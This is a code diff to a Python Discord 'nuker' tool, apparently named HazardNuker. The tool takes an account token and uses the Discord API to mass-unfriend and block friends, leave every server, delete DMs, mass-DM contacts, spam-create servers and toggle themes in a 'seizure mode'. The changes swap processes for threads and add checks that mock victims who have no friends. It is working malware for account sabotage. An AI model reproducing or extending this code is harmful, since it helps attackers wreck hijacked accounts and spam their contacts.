@@ -11,6 +11,7 @@ import os
 
 from time import sleep
 from colorama import Fore
+from signal import signal, SIGINT
 
 from util.plugins.common import *
 from util.plugins.update import search_for_updates
@@ -70,19 +71,26 @@ def main():
         token = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
         validateToken(token)
+        #check if they're lonely and don't have any friends
+        if not requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json():
+            print(f"")
+            sleep(3)
+            main()
         #get all friends
         processes = []
         friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
+        if not friendIds:
+            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no friends ")
+            sleep(3)
+            main()
         for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
-            t = multiprocessing.Process(target=util.unfriender.UnFriender, args=(token, friend))
+            t = threading.Thread(target=util.unfriender.UnFriender, args=(token, friend))
             t.start()
             processes.append(t)
-        while True:
-            if keyboard.is_pressed(cancel_key):
-                for process in processes:
-                    process.terminate()
-                main()
-                break
+        for process in processes:
+            process.join()
+        sleep(1.5)
+        main()
 
 
     elif choice == '3':
@@ -95,16 +103,18 @@ def main():
         processes = []
         #get all servers
         guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
+        if not guildsIds:
+            print(f"{Fore.RESET}Damn this guy isn't in any servers")
+            sleep(3)
+            main()
         for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
-            t = multiprocessing.Process(target=util.server_leaver.Leaver, args=(token, guild))
+            t = threading.Thread(target=util.server_leaver.Leaver, args=(token, guild))
             t.start()
             processes.append(t)
-        while True:
-            if keyboard.is_pressed(cancel_key):
-                for process in processes:
-                    process.terminate()
-                main()
-                break
+        for process in processes:
+            process.join()
+        sleep(1.5)
+        main()
                 
 
     elif choice == '4':
@@ -112,7 +122,7 @@ def main():
         validateToken(token)
         print(f'{Fore.BLUE}Do you want to have a icon for the servers that will be created?')
         yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
-        if yesno.lower() == "yes":
+        if yesno.lower() == "y" or yesno.lower() == "yes":
             image = input(f'Example: (C:\\Users\\myName\\Desktop\\HazardNuker\\ShitOn.png):\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Please input the icon location: {Fore.RED}')
             if not os.path.exists(image):
                 print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Couldn\'t find "{image}" on your pc')
@@ -134,32 +144,31 @@ def main():
             sleep(1)
             main()
         if secondchoice == "1":
+            amount = 25
             processes = []
-            for i in range(25):
-                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon))
+            if hasNitroBoost(token):
+                amount = 50
+            for i in range(amount):
+                t = threading.Thread(target=util.spamservers.SpamServers, args=(token, icon))
                 t.start()
                 processes.append(t)
-            while True:
-                if keyboard.is_pressed(cancel_key):
-                    for process in processes:
-                        process.terminate()
-                    main()
-                    break
+            for process in processes:
+                process.join()
+            sleep(1.5)
+            main()
 
         if secondchoice == "2":
-            name = str(input(
-                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
+            name = input(
+                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}')
             processes = []
             for i in range(25):
-                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon, name))
+                t = threading.Thread(target=util.spamservers.SpamServers, args=(token, icon, name))
                 t.start()
                 processes.append(t)
-            while True:
-                if keyboard.is_pressed(cancel_key):
-                    for process in processes:
-                        process.terminate()
-                    main()
-                    break
+            for process in processes:
+                process.join()
+            sleep(1.5)
+            main()
 
 
     elif choice == '5':
@@ -168,16 +177,18 @@ def main():
         validateToken(token)
         processes = []
         channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
+        if not channelIds:
+            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
+            sleep(3)
+            main()
         for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
-                t = multiprocessing.Process(target=util.dmdeleter.DmDeleter, args=(token, channel))
+                t = threading.Thread(target=util.dmdeleter.DmDeleter, args=(token, channel))
                 t.start()
                 processes.append(t)
-        while True:
-            if keyboard.is_pressed(cancel_key):
-                for process in processes:
-                    process.terminate()
-                main()
-                break
+        for process in processes:
+            process.join()
+        sleep(1.5)
+        main()
 
 
     elif choice == '6':
@@ -188,16 +199,16 @@ def main():
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
         processes = []
         channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
+        if not channelIds:
+            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
+            sleep(3)
+            main()
         for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
-            t = multiprocessing.Process(target=util.massdm.MassDM, args=(token, channel, message))
+            t = threading.Thread(target=util.massdm.MassDM, args=(token, channel, message))
             t.start()
             processes.append(t)
-        while True:
-            if keyboard.is_pressed(cancel_key):
-                for process in processes:
-                    process.terminate()
-                main()
-                break
+        sleep(1.5)
+        main()
 
 
     elif choice == '7':
@@ -205,6 +216,7 @@ def main():
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
         validateToken(token)
         print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
+        SlowPrint(f"{Fore.RED}{cancel_key}{Fore.RESET} at anytime to stop")
         processes = [] 
         for i in range(threads):
             t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
@@ -216,7 +228,6 @@ def main():
                     process.terminate()
                 main()
                 break
-
 
     elif choice == '8':
         token = input(
@@ -235,18 +246,20 @@ def main():
         token = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
         validateToken(token)
-        processes = []
         friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
+        if not friendIds:
+            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no friends ")
+            sleep(3)
+            main()
+        processes = []
         for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
-            t = multiprocessing.Process(target=util.friend_blocker.Block, args=(token, friend))
+            t = threading.Thread(target=util.friend_blocker.Block, args=(token, friend))
             t.start()
             processes.append(t)
-        while True:
-            if keyboard.is_pressed(cancel_key):
-                for process in processes:
-                    process.terminate()
-                main()
-                break
+        for process in processes:
+            process.join()
+        sleep(1.5)
+        main()
 
 
     elif choice == '11':
@@ -427,7 +440,7 @@ def main():
                 print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Theme')
                 sleep(1.5)
                 main()
-            print_slow(f"{Fore.GREEN}Theme set to {Fore.CYAN}{getTheme()}")
+            SlowPrint(f"{Fore.GREEN}Theme set to {Fore.CYAN}{getTheme()}")
             sleep(0.5)
             main()
 
@@ -452,7 +465,7 @@ def main():
                     sleep(0.5)
                     main()
             threads = amount
-            print_slow(f"{Fore.GREEN}Threads set to {Fore.CYAN}{amount}")
+            SlowPrint(f"{Fore.GREEN}Threads set to {Fore.CYAN}{amount}")
             sleep(0.5)
             main()
         
@@ -469,7 +482,7 @@ ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl
             sleep(1.5)
             key = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Key: {Fore.RED}')
             cancel_key = key
-            print_slow(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
+            SlowPrint(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
             sleep(0.5)
             main()
 
@@ -487,6 +500,11 @@ ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl
         main()
 
 if __name__ == "__main__":
+    def handler(signal, frame):
+        print(Fore.RED + "\n\nGoodbye!" + Fore.RESET)
+        sleep(3)
+        os._exit(0)
+    signal(SIGINT, handler)
     import sys
     if os.path.basename(sys.argv[0]).endswith("exe"):
         search_for_updates()
